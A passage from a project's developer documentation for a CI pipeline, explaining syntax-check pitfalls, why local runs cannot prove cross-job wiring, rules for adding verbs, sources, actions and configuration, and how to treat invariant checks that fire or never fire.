error then names the word *after* the backtick rather than the comment that caused it
(`SyntaxError: Unexpected identifier 'body'`), and three of the eleven scripts are not
reached by any other test, so a broken one can otherwise pass the whole suite and reach
CI intact. Write straight quotes inside that template. `tests/syntax.test.mjs` carries
a synthetic case in exactly that shape, so the check is known to be able to fail.

**What a local run cannot prove.** Running the steps in sequence leaves them all
in one `.run/` directory, which is exactly what GitHub replaces with an explicit
artifact handoff between jobs. So a sequential local run proves the code, not the
wiring — which is how a green 238-test suite coexisted with a pipeline that could
not produce a correct digest (I15). Anything that crosses a job boundary is a
platform fact: verify it on a real run.

To run the whole pipeline locally without touching git:

```bash
node scripts/fetch-step.mjs && node scripts/narrate-step.mjs && \
  node -e "import('./lib/gate.mjs').then(async g=>{...})"
```

---

## 5. Adding things

- **A new verb** goes in `lib/commands.mjs` first, with its argument validator,
  then in the reply renderer. If it calls a model, it belongs in the `explain`
  job, not `route`.
- **A new source** goes in `lib/sources.mjs` and must be keyless or already
  authenticated. A source needing a new secret needs a new job, because of I1.
- **A new output surface** must be added to the write allowlist deliberately
  (I3), and must not move the gate out of the keyless job (I2).
- **A new action** must be pinned to a 40-hex commit with the release in a
  trailing comment (I12). `checkActionsPinned()` will refuse a tag.
- **A new configuration variable** goes in the I8 table in this file, then in the
  `env:` of every workflow that needs it (I14). The table is the source, not the
  afterthought — `checkConfigSurface()` reads it and will fail either half if you
  do one and not the other.
- **A new rule** is not a rule until `lib/invariants.mjs` checks it and
  `tests/invariants.test.mjs` proves the check fires. A check that has never been
  seen to fail is a check nobody can trust — write the synthetic case that breaks
  it before you write the code that fixes it.
- **A new outbound API call** is asserted on the **request**, not only on the
  response. A stub that answers whatever the code asks stays green while the
  request is being rejected by the real service; assert the body the code sends
  against the field names the vendor documents.
- **Do not merge jobs.** See I1.

---

## 6. When a check fires

The checks in this repository have, so far, been right and the code wrong. Four
of them were load-bearing on the day they were written:

- the containment gate rejected **every** grounded sentence, because the version
  and advisory-id extractors read version literals as package names;
- the one-privilege-per-job check was **not enforcing anything**, because the
  YAML reader popped its own sequence frame and could not see `secrets.` inside a
  step;
- the config-surface check (I14) found, on first run, two names a workflow asked
  for that the table did not list, and one the code read that no workflow
  delivered;
- the fact-grounding test, run over the typed-layer path, found the reason string
  for the escalation band contained a word the gate reads as a package name —
  which is the check catching prose, not a fact, and the reason the reason
  strings are deliberately number-free and plain.

All passed review. All were found by writing a test that asserted the intended
behaviour rather than the implemented one. So:

**When a check fires, the first hypothesis is that the check is right.** Read the
rule, then read the code it covers, then decide. "The check is too strict" is a
conclusion, not a starting position.

**The mirror image is a check that never fires, and running it cannot find that.**
The publication guard (I16) was first written as a list of three forbidden paths,
and passed three files that were in the repository — including
`data/heartbeat.json`, the very field the projection had just removed. Its
replacement was wrong in a second way: three clauses decided a path by how it was
*spelled*, so one resolved path had two verdicts depending on whether the traversal
was written as one argument or three. Neither defect was reachable by running the
check. It was green, and correctly green, for every input anyone had thought to
try.

Both were found by asking **what would have to change for this to be wrong**, and
then changing it. That is why a **must-fail control** belongs inside the check
rather than beside it: a mutant that disables a clause and requires its cases to
flip green. A refusal on its own proves nothing about which clause refused — and
for a guard like this one, a refusal is the only output there is.
